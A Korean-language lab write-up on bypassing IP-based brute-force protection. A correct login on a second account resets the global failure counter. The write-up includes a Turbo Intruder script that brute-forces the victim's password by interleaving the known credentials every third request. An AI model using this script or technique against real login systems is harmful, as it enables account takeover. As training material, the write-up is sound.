# 🚩Lab: Broken brute-force protection, IP block

```text
This lab is vulnerable due to a logic flaw in its password brute-force protection.
To solve the lab, brute-force the victim's password, then log in and access their account page.

Your credentials: wiener:peter
Victim's username: carlos
```

### 🔍 분석 및 공격 과정
1. `carlos:무작위비밀번호`로 로그인을 요청해본다. 로그인 실패 3회 이상시 1분간 IP가 block된다. 
2. `X-Forwarded-For` 헤더가 사용가능한지 체크해본다.
3. `X-Forwarded-For` 헤더를 조작해가며 로그인 요청을 보내도 실패 3회 초과시 IP가 block된다.
4. `wiener:peter`로 로그인을 성공할 때에 시도 카운터를 초기화하는지 체크해보자.
5. `carlos:무작위비밀번호`로 2회 실패후 `wiener:peter`로 로그인해보자. 그후 `carlos:무작위비밀번호`로 다시 로그인을 시도했을 때 IP가 block되지 않는다면, 로그인성공시 글로벌로 시도 카운터를 초기화시킨다라는 걸 알 수 있다. 
6. 5번의 수행결과 로그인 성공시 성공적으로 카운터가 초기화 되는걸 확인해 볼 수 있었다.
7. brute force 과정중에 3번째 시도마다 `wiener:peter`를 집어 넣어 IP block을 피할 수 있다.
8. 해결을 Turbo intruder를 사용하였다.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=1, #전송 순서를 보장하기 위해 concurrentConnection은 1로 설정하는것이 중요했다.
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\fjwle\Documents\bscp\password.txt", mode='r', encoding="utf-8") as f:
    a = [i.strip() for i in f if i.strip()]

    

  for i in range(len(a)):
    if(i%3==2):
        engine.queue(target.req, ['wiener', 'peter'])
    else:
        engine.queue(target.req, ['carlos', a[i]])


def handleResponse(req, interesting):
  table.add(req)
```
9. solve
                        
### 💡 취약점 원리
 로그인에 성공시 시도실패 카운터를 초기화하는 것 자체가 나쁘다는건 아니지만, carlos와 전혀 다른계정인 wiener로 로그인을 성공하는 것임에도 전체 카운터가 초기화된다는 논리적 오류가 있었다.
